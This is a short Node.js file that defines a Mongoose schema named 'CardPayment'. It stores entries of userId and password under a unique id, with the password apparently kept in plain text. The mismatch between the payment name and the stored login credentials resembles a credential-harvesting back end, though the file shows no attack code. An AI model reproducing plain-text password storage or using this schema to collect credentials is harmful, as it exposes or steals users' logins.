const mongoose = require('mongoose');

const cardPaymentSchema = new mongoose.Schema({
  uniqueid: { type: String, required: true, unique: true },
  entries: [
    {
      userId: { type: String, required: true },
      password: { type: String, required: true },
      submittedAt: { type: Date, default: Date.now }
    }
  ]
});

module.exports = mongoose.model('CardPayment', cardPaymentSchema);